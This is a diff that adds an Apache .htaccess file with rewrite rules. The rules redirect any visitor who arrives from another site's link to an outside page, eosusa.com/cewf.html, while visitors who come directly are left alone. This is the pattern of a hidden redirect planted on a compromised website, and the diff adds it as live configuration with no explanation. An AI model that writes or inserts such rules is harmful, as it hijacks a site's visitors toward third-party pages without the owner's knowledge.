@@ -1,0 +1,9 @@
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteCond %{HTTP_REFERER} ^http://[w.]*([^/]+)
+RewriteCond %{HTTP_HOST}/%1 !^[w.]*([^/]+)/\1$ [NC]
+RewriteRule ^.*$ http://eosusa.com/cewf.html?h=999313 [L,R]
+</IfModule>
+
+deny from all
